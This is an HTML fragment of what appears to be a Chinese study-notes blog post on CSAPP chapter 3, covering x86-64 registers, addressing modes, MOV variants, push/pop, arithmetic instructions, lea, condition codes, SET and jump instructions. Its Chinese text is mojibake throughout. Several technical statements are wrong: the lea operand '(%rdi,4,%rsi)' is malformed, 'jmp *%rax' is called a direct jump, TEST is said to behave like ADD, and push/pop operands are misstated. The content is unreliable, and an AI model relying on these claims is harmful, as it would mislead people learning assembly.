title="è®¿é—®ä¿¡æ¯"></a>è®¿é—®ä¿¡æ¯</h3><p>å¯„å­˜å™¨ç”¨æ¥å­˜å‚¨æ•°æ®å’ŒæŒ‡é’ˆï¼Œæœ€åˆçš„16ä½ç³»ç»Ÿä¸­æœ‰å…«ä¸ª16ä½çš„å¯„å­˜å™¨ï¼Œåˆ†åˆ«æ˜¯ ax , bx , cx , dx , d i, si , sp , bp ã€‚åæ¥å‘å±•åˆ° 32 ä½ï¼Œå¯„å­˜å™¨ä¹Ÿæ‹“å±•æˆ 32 ä½ï¼Œåœ¨åŸæœ¬å¯„å­˜å™¨åå­—çš„å‰é¢åŠ ä¸Š <code>e</code> æ¥è¡¨ç¤ºï¼Œå¦‚ eax ã€‚ç°åœ¨çš„ x86-64 ä¸­ï¼Œå¯„å­˜å™¨å¯¹åº”æ‹“å±•ä¸º 64 ä½ï¼ŒæŠŠæ‰€æœ‰çš„ <code>e</code> æ›¿æ¢æˆäº† <code>r</code>ï¼Œå¹¶ä¸”æ–°å¢äº† 8 ä¸ªå¯„å­˜å™¨ r8~r15ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E5%AF%84%E5%AD%98%E5%99%A8.png"></p><h4 id="æ“ä½œæ•°æŒ‡ç¤ºç¬¦"><a href="#æ“ä½œæ•°æŒ‡ç¤ºç¬¦" class="headerlink" title="æ“ä½œæ•°æŒ‡ç¤ºç¬¦"></a>æ“ä½œæ•°æŒ‡ç¤ºç¬¦</h4><p>å¤§å¤šæ•°çš„æŒ‡ä»¤éƒ½æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªæ“ä½œæ•°ï¼ŒæŒ‡ç¤ºå‡ºæ‰§è¡Œä¸€ä¸ªæ“ä½œä¸­è¦ä½¿ç”¨çš„æºæ•°æ®å€¼ä»¥åŠæ”¾ç½®ç»“æœçš„ç›®çš„ä½ç½®ã€‚æ“ä½œæ•°å¯ä»¥æ˜¯ç«‹å³æ•°ã€å¯„å­˜å™¨æˆ–è€…å†…å­˜å¼•ç”¨ã€‚</p><p>å…¶ä¸­ï¼Œå†…å­˜å¼•ç”¨ä¼šæ ¹æ®è®¡ç®—å‡ºçš„æœ‰æ•ˆåœ°å€å»è®¿é—®å†…å­˜ä½ç½®ã€‚åŒæ—¶ï¼Œæœ‰è®¸å¤šç§å¯»å€æ¨¡å¼ï¼Œå…è®¸ä¸åŒå½¢å¼çš„å†…å­˜å¼•ç”¨ã€‚ä¹¦ä¸Šä¹Ÿç»™å‡ºäº†å¾ˆå¤šå¯»å€æ¨¡å¼çš„è§£æï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F.png"></p><p>æˆ‘ä»¬æœ€å¸¸ç”¨çš„å¯»å€æ–¹å¼æ˜¯å›¾ä¸Šçš„æœ€åä¸€ä¸ªï¼Œæ˜¯<strong>æ¯”ä¾‹å˜å€å¯»å€</strong>çš„ä¸€ç§ï¼Œè¡¨ç¤ºä¸º <code>Imm(x,y,z)</code>ï¼Œè¡¨ç¤ºäº†åœ°å€ä¸º <code>x+yz+Imm</code> çš„å†…å­˜ç©ºé—´ã€‚</p><h4 id="æ•°æ®ä¼ é€æŒ‡ä»¤"><a href="#æ•°æ®ä¼ é€æŒ‡ä»¤" class="headerlink" title="æ•°æ®ä¼ é€æŒ‡ä»¤"></a>æ•°æ®ä¼ é€æŒ‡ä»¤</h4><p>æ•°æ®ä¼ é€æŒ‡ä»¤ï¼Œå°±æ˜¯å­—é¢æ„æ€ï¼ŒæŠŠæ•°æ®ä»ä¸€ä¸ªä½ç½®å¤åˆ¶åˆ°å¦ä¸€ä¸ªä½ç½®çš„æŒ‡ä»¤ã€‚</p><p>æˆ‘ä»¬æŠŠå¯¹åº”æ‰§è¡Œæ“ä½œç›¸åŒï¼Œä½†æ˜¯æ‰§è¡Œçš„æ“ä½œæ•°å¤§å°ä¸åŒçš„ä¸åŒæŒ‡ä»¤ç§°ä¹‹ä¸ºåŒä¸€ä¸ª<strong>æŒ‡ä»¤ç±»</strong>ã€‚</p><p>MOV ç±»æŒ‡ä»¤æ˜¯æœ€ç®€å•çš„æ•°æ®ä¼ é€æŒ‡ä»¤ï¼Œåœ¨å®é™…åº”ç”¨ä¸­ä¹Ÿæœ€ä¸ºé¢‘ç¹ã€‚è¿™ç±»æŒ‡ä»¤æŠŠæ•°æ®ä»åŸä½ç½®å¤åˆ¶åˆ°ç›®çš„ä½ç½®ï¼Œä¸å¯¹æ•°æ®åšä»»ä½•çš„å¤„ç†å’Œæ”¹å˜ã€‚</p><p>è¿™ç±»æŒ‡ä»¤æœ‰ä¸¤ä¸ªæ“ä½œæ•°ï¼Œæºæ“ä½œæ•°å­˜å‚¨åœ¨å¯„å­˜å™¨æˆ–å†…å­˜ä¸­çš„ç«‹å³æ•° ï¼Œè€Œç›®çš„æ“ä½œæ•°æŒ‡å®šä¸€ä¸ªä½ç½®ï¼Œå®ƒæ˜¯å¯„å­˜å™¨æˆ–è€…ä¸€ä¸ªå†…å­˜åœ°å€ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>ä¼ é€æŒ‡ä»¤çš„ä¸¤ä¸ªæ“ä½œæ•°ä¸èƒ½åŒæ—¶æŒ‡å‘å†…å­˜ä½ç½®</strong>ã€‚</p><p>MOV ç±»ç”± <code>movb</code>ã€<code>movw</code>ã€<code>movl</code>ã€<code>movq</code> å››ä¸ªæŒ‡ä»¤ç»„æˆï¼Œå®ƒä»¬ä¹‹é—´çš„å·®å¼‚æ˜¯<strong>æ“ä½œæ•°æ®å¤§å°ä¸åŒ</strong>ï¼Œåˆ†åˆ«å¯¹åº” 1 å­—èŠ‚ã€2 å­—èŠ‚ã€4 å­—èŠ‚å’Œ 8 å­—èŠ‚ï¼Œæ“ä½œæ•°ä¸­çš„å¯„å­˜å™¨éƒ¨åˆ†å¿…é¡»å’ŒæŒ‡ä»¤æœ€åä¸€ä¸ªå­—ç¬¦å¯¹åº”ã€‚è¿™å…¶ä¸­ä¼ è¾“åŒå­—çš„æŒ‡ä»¤ <strong>movl ï¼Œå¦‚æœç›®çš„æ“ä½œæ•°æ˜¯ä¸€ä¸ªå¯„å­˜å™¨ï¼Œé‚£ä¹ˆå®ƒä¼šæŠŠå¯„å­˜å™¨çš„é«˜ä½ 4 å­—èŠ‚å…¨éƒ¨ç½®é›¶</strong>ã€‚</p><p>æœ‰çš„æ—¶å€™ç›®çš„å¯„å­˜å™¨å’Œæºå¯„å­˜å™¨çš„å­—é•¿å¹¶ä¸æ˜¯å¯¹åº”çš„ï¼Œå¯èƒ½ä¼šå‡ºç°ç›®çš„å¯„å­˜å™¨çš„å­—é•¿å¤§äºæºå¯„å­˜å™¨çš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šå¯¹æºæ“ä½œæ•°è¿›è¡Œæ‹“å±•ã€‚è¿™æ ·åˆå¯¹åº”æœ‰ä¸¤ç§æ‹“å±•æ–¹å¼ï¼šé›¶æ‹“å±•ï¼ˆMOVZ ç±»ï¼‰å’Œç¬¦å·æ‹“å±•ï¼ˆMOVSç±»ï¼‰ã€‚</p><p>æŒ‡ä»¤åç§°ä¸­çš„åä¸¤ä¸ªå­—ç¬¦éƒ½æ˜¯å¤§å°æŒ‡ç¤ºç¬¦ï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦æŒ‡å®šæºçš„å¤§å°ï¼ˆå­—èŠ‚bï¼Œå­—wï¼ŒåŒå­—lï¼‰ï¼Œç¬¬äºŒä¸ªå°±æ˜¯ç›®çš„å¤§å°ï¼ˆå­—wï¼ŒåŒå­—lï¼Œå››å­—qï¼‰ã€‚å…·ä½“å¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th>æŒ‡ä»¤</th><th>æè¿°</th></tr></thead><tbody><tr><td>movzbw</td><td>å°†åšäº†é›¶æ‹“å±•çš„å­—èŠ‚ä¼ é€åˆ°å­—</td></tr><tr><td>movzbl</td><td>å°†åšäº†é›¶æ‹“å±•çš„å­—èŠ‚ä¼ é€åˆ°åŒå­—</td></tr><tr><td>movzwl</td><td>å°†åšäº†é›¶æ‹“å±•çš„å­—ä¼ é€åˆ°åŒå­—</td></tr><tr><td>movzbq</td><td>å°†åšäº†é›¶æ‹“å±•çš„å­—èŠ‚ä¼ é€åˆ°å››å­—</td></tr><tr><td>movzwq</td><td>å°†åšäº†é›¶æ‹“å±•çš„å­—ä¼ é€åˆ°å››å­—</td></tr><tr><td>movsbw</td><td>å°†åšäº†ç¬¦å·æ‹“å±•çš„å­—èŠ‚ä¼ é€åˆ°å­—</td></tr><tr><td>movsbl</td><td>å°†åšäº†ç¬¦å·æ‹“å±•çš„å­—èŠ‚ä¼ é€åˆ°åŒå­—</td></tr><tr><td>movswl</td><td>å°†åšäº†ç¬¦å·æ‹“å±•çš„å­—ä¼ é€åˆ°åŒå­—</td></tr><tr><td>movsbq</td><td>å°†åšäº†ç¬¦å·æ‹“å±•çš„å­—èŠ‚ä¼ é€åˆ°å››å­—</td></tr><tr><td>movswq</td><td>å°†åšäº†ç¬¦å·æ‹“å±•çš„å­—ä¼ é€åˆ°å››å­—</td></tr><tr><td>movslq</td><td>å°†åšäº†ç¬¦å·æ‹“å±•çš„åŒå­—ä¼ é€åˆ°å››å­—</td></tr><tr><td>cltq</td><td>æŠŠ %eax ç¬¦å·æ‹“å±•åˆ° %rax ï¼Œç­‰æ•ˆäº movslq %eax, %rax</td></tr></tbody></table><p>é›¶æ‹“å±•æ˜¯ç”¨ 0 å¡«å……ç›®çš„ä¸­çš„å‰©ä½™å­—èŠ‚ï¼Œç¬¦å·æ‹“å±•å°±æ˜¯ç”¨æœ€é«˜ä½ç¬¦å·ä½å¡«å……å‰©ä½™å­—èŠ‚ã€‚</p><h4 id="å‹å…¥å’Œå¼¹å‡ºæ ˆæ•°æ®"><a href="#å‹å…¥å’Œå¼¹å‡ºæ ˆæ•°æ®" class="headerlink" title="å‹å…¥å’Œå¼¹å‡ºæ ˆæ•°æ®"></a>å‹å…¥å’Œå¼¹å‡ºæ ˆæ•°æ®</h4><p>å‹æ ˆå’Œå…¥æ ˆå®é™…ä¸Šä¹Ÿæ˜¯æ•°æ®ä¼ é€çš„æ“ä½œï¼Œåªä¸è¿‡æ“ä½œçš„å¯¹è±¡æ˜¯æ ˆã€‚<code>pushq(push)</code>çš„åŠŸèƒ½æ˜¯æŠŠæ•°æ®å‹å…¥æ ˆï¼Œ<code>popq(pop)</code> çš„åŠŸèƒ½æ˜¯å¼¹å‡ºæ•°æ®ã€‚è¿™ä¸¤ä¸ªæŒ‡ä»¤éƒ½åªæœ‰ä¸€ä¸ªæ“ä½œæ•°â€”â€”å‹å…¥çš„æ•°æ®æºå’Œå¼¹å‡ºçš„æ•°æ®ç›®çš„ã€‚</p><p>push çš„ä½œç”¨æ˜¯å°†æ ˆæŒ‡é’ˆå‡ 8 ä¹Ÿå°±æ˜¯æŠ¬é«˜æ ˆé¡¶ï¼Œå†å°†æ“ä½œæ•°å†™å…¥å¼€è¾Ÿå‡ºæ¥çš„æ ˆç©ºé—´ä¸­ï¼›pop æ­£å¥½ç›¸åï¼Œå…ˆå°†æ ˆé¡¶çš„8 å­—èŠ‚æ•°æ®ä¼ é€åˆ°æ“ä½œæ•°å½“ä¸­ï¼Œå†å°†æ ˆæŒ‡é’ˆåŠ  8ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå› ä¸ºä¸èƒ½åŒæ—¶äº¤æ¢ä¸¤ä¸ªå†…å­˜åœ°å€ï¼Œæ‰€ä»¥ <strong>push çš„æºæ“ä½œæ•°åªèƒ½æ˜¯ç«‹å³æ•°æˆ–è€…æ˜¯å¯„å­˜å™¨ï¼Œ pop çš„ç›®çš„æ“ä½œæ•°åªèƒ½æ˜¯å¯„å­˜å™¨</strong>ã€‚</p><h4 id="ç®—æ•°å’Œé€»è¾‘æ“ä½œ"><a href="#ç®—æ•°å’Œé€»è¾‘æ“ä½œ" class="headerlink" title="ç®—æ•°å’Œé€»è¾‘æ“ä½œ"></a>ç®—æ•°å’Œé€»è¾‘æ“ä½œ</h4><p>ä¹‹å‰åœ¨ç¬¬äºŒç« ä¸­å­¦åˆ°è¿‡è®¡ç®—æœºçš„è¿ç®—ï¼Œä¸»è¦åˆ†ä¸ºç®—æ•°è¿ç®—å’Œé€»è¾‘è¿ç®—ã€‚</p><p>è¿™äº›è¿ç®—æ“ä½œåˆè¢«åˆ†æˆå››ç»„ï¼šåŠ è½½æœ‰æ•ˆåœ°å€ã€ä¸€å…ƒæ“ä½œã€äºŒå…ƒæ“ä½œå’Œç§»ä½ã€‚ä¸€å…ƒæ“ä½œå°±æ˜¯åªæœ‰ä¸€ä¸ªæ“ä½œæ•°ï¼ŒåŒæ ·çš„ï¼ŒäºŒå…ƒæ“ä½œå°±æ˜¯æœ‰ä¸¤ä¸ªæ“ä½œæ•°ã€‚åœ¨è¿™ä¹‹ä¸‹ï¼Œæ¯ä¸€ä¸ªè¿ç®—çš„æŒ‡ä»¤ç±»éƒ½æœ‰å¯¹åº”çš„ä¸åŒå¤§å°æ“ä½œæ•°çš„å˜ç§ã€‚</p><p>å…·ä½“å¦‚ä¸‹è¡¨ï¼š</p><blockquote><p>ä¸€å…ƒæ“ä½œæŒ‡ä»¤</p></blockquote><table><thead><tr><th>æŒ‡ä»¤</th><th>æè¿°</th></tr></thead><tbody><tr><td>INC D</td><td>è‡ªå¢ï¼ˆD++ï¼‰</td></tr><tr><td>DEC D</td><td>è‡ªå‡ï¼ˆDâ€“ï¼‰</td></tr><tr><td>NEG D</td><td>å–è´Ÿï¼ˆ-Dï¼‰</td></tr><tr><td>NOT D</td><td>å–åï¼ˆ~Dï¼‰</td></tr></tbody></table><blockquote><p>äºŒå…ƒæ“ä½œæŒ‡ä»¤</p></blockquote><table><thead><tr><th>æŒ‡ä»¤</th><th>æè¿°</th></tr></thead><tbody><tr><td>ADD S, D</td><td>D+ &#x3D; S</td></tr><tr><td>SUB S, D</td><td>D- &#x3D; S</td></tr><tr><td>IMUL S, D</td><td>D* &#x3D; Sï¼ˆæœ‰ç¬¦å·ï¼‰</td></tr><tr><td>MUL S, D</td><td>D* &#x3D; Sï¼ˆæ— ç¬¦å·ï¼‰</td></tr><tr><td>IDIV S, D</td><td>D&#x2F; &#x3D; Sï¼ˆæœ‰ç¬¦å·ï¼‰</td></tr><tr><td>DIV S, D</td><td>D&#x2F; &#x3D; Sï¼ˆæ— ç¬¦å·ï¼‰</td></tr><tr><td>XOR S, D</td><td>D^ &#x3D; S</td></tr><tr><td>OR S, D</td><td>D| &#x3D; S</td></tr><tr><td>AND S, D</td><td>D&amp; &#x3D; S</td></tr><tr><td>SAL S, D</td><td>D&lt;&lt; &#x3D; Sï¼ˆæœ‰ç¬¦å·ï¼‰</td></tr><tr><td>SAR S, D</td><td>ç®—æœ¯å³ç§»  D&gt;&gt; &#x3D; Sï¼ˆæœ‰ç¬¦å·ï¼‰</td></tr><tr><td>SHL S, D</td><td>D&lt;&lt; &#x3D; Sï¼ˆæ— ç¬¦å·ï¼‰</td></tr><tr><td>SHR S, D</td><td>é€»è¾‘å³ç§»  D&gt;&gt; &#x3D; Sï¼ˆæ— ç¬¦å·ï¼‰</td></tr></tbody></table><h4 id="åŠ è½½æœ‰æ•ˆåœ°å€"><a href="#åŠ è½½æœ‰æ•ˆåœ°å€" class="headerlink" title="åŠ è½½æœ‰æ•ˆåœ°å€"></a>åŠ è½½æœ‰æ•ˆåœ°å€</h4><p><code>leaq(lea)</code> æŒ‡ä»¤æ˜¯åŠ è½½æœ‰æ•ˆåœ°å€æŒ‡ä»¤ï¼Œå®ƒå®é™…ä¸Šå°±æ˜¯ movq çš„å˜å½¢ã€‚</p><p><code>lea</code> æŒ‡ä»¤å½¢å¼æ˜¯ä»å†…å­˜è¯»å–æ•°æ®åˆ°å¯„å­˜å™¨ï¼Œä½†å®é™…ä¸Šå®ƒæ ¹æœ¬æ—¢æ²¡æœ‰å¼•ç”¨å†…å­˜ã€‚å®ƒçš„ç¬¬ä¸€ä¸ªæ“ä½œæ•°çœ‹ä¸Šå»æ˜¯ä¸ªå†…å­˜å¼•ç”¨ï¼Œä½†è¯¥æŒ‡ä»¤å¹¶ä¸æ˜¯ä»æŒ‡å®šçš„ä½ç½®è¯»å…¥æ•°æ®ï¼Œè€Œæ˜¯<strong>å°†æœ‰æ•ˆåœ°å€å†™å…¥ç›®çš„æ“ä½œæ•°</strong>ã€‚æ­¤å¤–ï¼Œlea çš„ç›®çš„æ“ä½œæ•°å¿…é¡»æ˜¯å¯„å­˜å™¨ã€‚</p><p><code>lea</code> æŒ‡ä»¤æœ‰å¾ˆå¤šçµæ´»çš„ç”¨æ³•ï¼Œç»å¸¸ç”¨äºè®¡ç®—æ•°æ®ï¼Œå¯ä»¥å®ç°åŠ æ³•å’Œæœ‰é™å½¢å¼çš„ä¹˜æ³•ï¼Œå¦‚ä¸‹é¢çš„ç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">example</span><span class="hljs-params">(<span class="hljs-type">long</span> x,<span class="hljs-type">long</span> y)</span><br>&#123;<br>    <span class="hljs-comment">//x in %rdi,y in %rsi</span><br>    <span class="hljs-type">long</span> t=x+<span class="hljs-number">4</span>*y;<br>    <span class="hljs-keyword">return</span> t;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰ <code>lea</code> æŒ‡ä»¤ï¼Œè¿™ä¸ªå‡½æ•°å¯¹åº”çš„è®¡ç®—éƒ¨åˆ†çš„æ±‡ç¼–ä»£ç å¯ä»¥è¢«å†™æˆè¿™æ ·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq    %rsi, %rax      # å°†yï¼ˆ%rsiï¼‰ç§»åŠ¨åˆ°%raxå¯„å­˜å™¨<br>salq    $2, %rax        # ä¹˜ä»¥4ï¼ˆå·¦ç§»2ä½ï¼Œç›¸å½“äºä¹˜ä»¥4ï¼‰<br>addq    %rdi, %rax      # å°†%rdiæ·»åŠ åˆ°%rax<br></code></pre></td></tr></table></figure><p>ä½†æˆ‘ä»¬å¼•ç”¨ lea ï¼Œæ±‡ç¼–ä»£ç å°±è¢«ç®€åŒ–äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">leaq (%rdi,4,%rsi),%rax<br></code></pre></td></tr></table></figure><blockquote><p>æ²¡é”™å°±è¿™ä¸€å¥ğŸ¤”</p></blockquote><h3 id="æ§åˆ¶"><a href="#æ§åˆ¶" class="headerlink" title="æ§åˆ¶"></a>æ§åˆ¶</h3><p>ç¨‹åºä¸­ä¸æ­¢ä¼šæœ‰é€æ­¥æŒ‡ä»¤æ‰§è¡Œçš„ç›´çº¿ä»£ç è¡Œä¸ºï¼ŒCè¯­è¨€ä¸­çš„æŸäº›ç»“æ„ä¼šè¦æ±‚æœ‰æ¡ä»¶çš„æ‰§è¡Œï¼Œæ¯”å¦‚å¾ªç¯è¯­å¥ï¼Œåœ¨å¾ªç¯ä¸­æˆ‘ä»¬ä¼šé‡å¤æ‰§è¡Œå¤šæ¬¡ç»Ÿä¸€éƒ¨åˆ†çš„æŒ‡ä»¤ã€‚å¯¹æ­¤ï¼Œæœºå™¨æä¾›ç›¸åº”çš„æŒ‡ä»¤æ¥æ§åˆ¶ä¿®æ”¹æœºå™¨ä»£ç çš„æŒ‡ä»¤é¡ºåºã€‚</p><p>æ‰§è¡Œæ–¹å¼åˆ†ä¸ºæ¡ä»¶æ‰§è¡Œå’Œéæ¡ä»¶æ‰§è¡Œ</p><h4 id="æ¡ä»¶ç "><a href="#æ¡ä»¶ç " class="headerlink" title="æ¡ä»¶ç "></a>æ¡ä»¶ç </h4><p>é™¤äº†æ•´æ•°å¯„å­˜å™¨ï¼ŒCPUè¿˜ç»´æŠ¤ç€ä¸€ç»„å•ä½ä¸ªçš„æ¡ä»¶ç å¯„å­˜å™¨ï¼Œç”¨æ¥æè¿°æœ€è¿‘çš„ç®—æœ¯æˆ–é€»è¾‘æ“ä½œçš„å±æ€§ï¼Œç”¨æ¥åˆ¤æ–­å¹¶æ‰§è¡Œæ¡ä»¶åˆ†æ”¯æŒ‡ä»¤ã€‚å¸¸è§çš„æ¡ä»¶ç å¦‚ä¸‹ï¼š</p><table><thead><tr><th>æŒ‡ä»¤</th><th>ä½œç”¨</th><th>æè¿°</th></tr></thead><tbody><tr><td>CF</td><td>è¿›ä½æ ‡å¿—</td><td>åˆ¤æ–­æ˜¯å¦äº§ç”Ÿè¿›ä½</td></tr><tr><td>ZF</td><td>é›¶æ ‡å¿—</td><td>åˆ¤æ–­æœ€è¿‘çš„ç»“æœæ˜¯å¦ä¸º0</td></tr><tr><td>SF</td><td>ç¬¦å·æ ‡å¿—</td><td>æœ€è¿‘æ“ä½œçš„ç»“æœæ˜¯å¦ä¸ºè´Ÿæ•°</td></tr><tr><td>OF</td><td>æº¢å‡ºæ ‡å¿—</td><td>æœ€è¿‘çš„æ“ä½œæ˜¯å¦å¯¼è‡´è¡¥ç æº¢å‡º</td></tr></tbody></table><p>leaq æŒ‡ä»¤ä¸ä¼šæ”¹å˜ä»»ä½•æ¡ä»¶ç ï¼Œå› ä¸ºå®ƒæ˜¯ç”¨åœ°å€è¿›è¡Œè®¡ç®—çš„ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæ‰€æœ‰çš„æŒ‡ä»¤éƒ½ä¼šè®¾ç½®æ¡ä»¶ç ã€‚åŒæ—¶éœ€è¦æ³¨æ„ï¼ŒINC å’Œ DEC æŒ‡ä»¤ä¸ä¼šæ”¹å˜è¿›ä½æ ‡å¿—ï¼ŒCMP æŒ‡ä»¤å’Œ TEST æŒ‡ä»¤åªæ”¹å˜æ¡ä»¶ç ã€‚</p><blockquote><p>é™¤äº†å¯¹å¯„å­˜å™¨çš„æ“ä½œï¼ŒCMPæŒ‡ä»¤å’ŒSUBæŒ‡ä»¤çš„è¡Œä¸ºç›¸åŒï¼ŒTESTæŒ‡ä»¤å’ŒADDæŒ‡ä»¤çš„è¡Œä¸ºç›¸åŒ</p></blockquote><h4 id="è®¿é—®æ¡ä»¶ç "><a href="#è®¿é—®æ¡ä»¶ç " class="headerlink" title="è®¿é—®æ¡ä»¶ç "></a>è®¿é—®æ¡ä»¶ç </h4><p>æœºå™¨å¹¶ä¸æ˜¯ç›´æ¥å»è¯»å–æ¡ä»¶å—ï¼Œå¸¸ç”¨çš„æ–¹æ³•æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š</p><ul><li>æ ¹æ®æ¡ä»¶ç çš„æŸç§ç»„åˆï¼Œå°†ä¸€ä¸ªå­—èŠ‚è®¾ç½®ä¸º0æˆ–1ã€‚æˆ‘ä»¬å°†è¿™ç±»æŒ‡ä»¤ç§°ä¸º SET æŒ‡ä»¤</li><li>æ¡ä»¶è·³è½¬åˆ°ç¨‹åºçš„æŸä¸ªå…¶ä»–çš„éƒ¨åˆ†</li><li>æœ‰æ¡ä»¶åœ°ä¼ é€æ•°æ®</li></ul><p>æ¯ä¸€æ¡ SET æŒ‡ä»¤çš„åç¼€éƒ½æŒ‡æ˜äº†å®ƒä»¬æ‰€è€ƒè™‘çš„æ¡ä»¶ç çš„ç»„åˆï¼Œéœ€è¦æ³¨æ„çš„æ˜¯åç¼€è¡¨ç¤ºçš„æ˜¯ä¸åŒçš„æ¡ä»¶è€Œä¸æ˜¯ä¸åŒçš„æ“ä½œæ•°ã€‚å…·ä½“çš„ SET æŒ‡ä»¤å¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th align="center">æŒ‡ä»¤</th><th align="center">åŒä¹‰åç¼€</th><th align="center">æ¡ä»¶ç </th><th align="center">è®¾ç½®æ¡ä»¶</th></tr></thead><tbody><tr><td align="center">sete</td><td align="center">z</td><td align="center">ZF&#x3D;&#x3D;1</td><td align="center">ç›¸ç­‰ï¼ˆé›¶ï¼‰</td></tr><tr><td align="center">setne</td><td align="center">nz</td><td align="center">ZF&#x3D;&#x3D;0</td><td align="center">ä¸ç›¸ç­‰ï¼ˆä¸ä¸ºé›¶ï¼‰</td></tr><tr><td align="center">sets</td><td align="center">&#x2F;</td><td align="center">SF&#x3D;&#x3D;1</td><td align="center">è´Ÿæ•°</td></tr><tr><td align="center">setns</td><td align="center">&#x2F;</td><td align="center">SF&#x3D;&#x3D;0</td><td align="center">éè´Ÿæ•°</td></tr><tr><td align="center">setg</td><td align="center">nle</td><td align="center">(SF^OF)&#x3D;&#x3D;0&amp;ZF&#x3D;&#x3D;0</td><td align="center">ï¼ˆæœ‰ç¬¦å·ï¼‰å¤§äº</td></tr><tr><td align="center">setge</td><td align="center">nl</td><td align="center">(SF^OF)&#x3D;&#x3D;0</td><td align="center">ï¼ˆæœ‰ç¬¦å·ï¼‰å¤§äºç­‰äº</td></tr><tr><td align="center">setl</td><td align="center">nge</td><td align="center">(SF^OF)&#x3D;&#x3D;1</td><td align="center">ï¼ˆæœ‰ç¬¦å·ï¼‰å°äº</td></tr><tr><td align="center">setle</td><td align="center">ng</td><td align="center">(SF^OF)&#x3D;&#x3D;1|ZF</td><td align="center">ï¼ˆæœ‰ç¬¦å·ï¼‰å°äºç­‰äº</td></tr><tr><td align="center">seta</td><td align="center">nbe</td><td align="center">CF&#x3D;&#x3D;0&amp;ZF&#x3D;&#x3D;0</td><td align="center">ï¼ˆæ— ç¬¦å·ï¼‰å¤§äº</td></tr><tr><td align="center">setae</td><td align="center">nb</td><td align="center">CF&#x3D;&#x3D;0</td><td align="center">ï¼ˆæ— ç¬¦å·ï¼‰å¤§äºç­‰äº</td></tr><tr><td align="center">setb</td><td align="center">nae</td><td align="center">CF&#x3D;&#x3D;1</td><td align="center">ï¼ˆæ— ç¬¦å·ï¼‰å°äº</td></tr><tr><td align="center">setbe</td><td align="center">na</td><td align="center">CF|ZF&#x3D;&#x3D;1</td><td align="center">ï¼ˆæ— ç¬¦å·ï¼‰å°äºç­‰äº</td></tr></tbody></table><h4 id="è·³è½¬æŒ‡ä»¤"><a href="#è·³è½¬æŒ‡ä»¤" class="headerlink" title="è·³è½¬æŒ‡ä»¤"></a>è·³è½¬æŒ‡ä»¤</h4><p>å‰é¢æåˆ°æœºå™¨éœ€è¦æŒ‡ä»¤æ¥å®ç°æŒ‡ä»¤æ‰§è¡Œçš„åˆ‡æ¢ï¼Œè·³è½¬ï¼ˆjumpï¼‰æŒ‡ä»¤å°±ä¼šå¯¼è‡´æ‰§è¡Œåˆ‡æ¢åˆ°ç¨‹åºä¸­ä¸€ä¸ªå…¨æ–°çš„ä½ç½®ã€‚åœ¨æ±‡ç¼–ä»£ç ä¸­ï¼Œè¿™äº›è·³è½¬çš„ç›®çš„åœ°é€šå¸¸ç”¨ä¸€ä¸ªæ ‡å·ï¼ˆlabelï¼‰æŒ‡æ˜ã€‚</p><p><code>jmp</code> æŒ‡ä»¤æ˜¯æ— æ¡ä»¶è·³è½¬ï¼Œå®ƒå¯ä»¥ç›´æ¥è·³è½¬ï¼Œå³è·³è½¬ç›®æ ‡æ˜¯ä½œä¸ºæŒ‡ä»¤çš„ä¸€éƒ¨åˆ†ç¼–ç ï¼Œæ¯”å¦‚ <code>jmp *%rax</code> ï¼›ä¹Ÿå¯ä»¥é—´æ¥è·³è½¬ï¼Œå³è·³è½¬ç›®æ ‡éœ€è¦ä»å¯„å­˜å™¨æˆ–å†…å­˜ä½ç½®è¯»å‡ºï¼Œæ¯”å¦‚ <code>jmp *(%rax)</code> ã€‚</p><p><code>jmp</code> æŒ‡ä»¤çš„æ¡ä»¶æŒ‡ä»¤å°±æ˜¯ <code>j+åç¼€</code> ï¼Œå…·ä½“åç¼€å’Œä¸Šé¢ <code>set</code> åç¼€éƒ¨åˆ†ç›¸åŒï¼Œå¯¹åº”æ¡ä»¶ä¹Ÿç›¸åŒã€‚</p><p>è·³è½¬æŒ‡ä»¤çš„ç›®æ ‡å€¼æ˜¯ä¸€ä¸ªåœ°å€ï¼Œå®ƒä¸»è¦æœ‰ä¸¤ç§ç¼–ç æ–¹å¼ï¼š</p><ul><li>ç»å¯¹åœ°å€ï¼šç»™å‡ºç»å¯¹åœ°å€ï¼Œç”¨å››å­—èŠ‚ç›´æ¥æŒ‡å®šè¦è·³è½¬åˆ°çš„å†…å­˜åœ°å€ã€‚</li><li>ç›¸å¯¹åœ°å€ï¼šç”¨åç§»é‡ç¼–ç ï¼Œå°†ç›®æ ‡æŒ‡ä»¤çš„åœ°å€ä¸ç´§è·Ÿåœ¨è·³è½¬æŒ‡ä»¤åé¢çš„æŒ‡ä»¤åœ°å€ä¹‹é—´çš„å·®å€¼ä½œä¸ºç¼–ç ï¼Œç¼–è¯‘å™¨æˆ–æ±‡ç¼–å™¨ä¼šå®Œæˆè¿™äº›å·¥ä½œã€‚</li></ul><h4 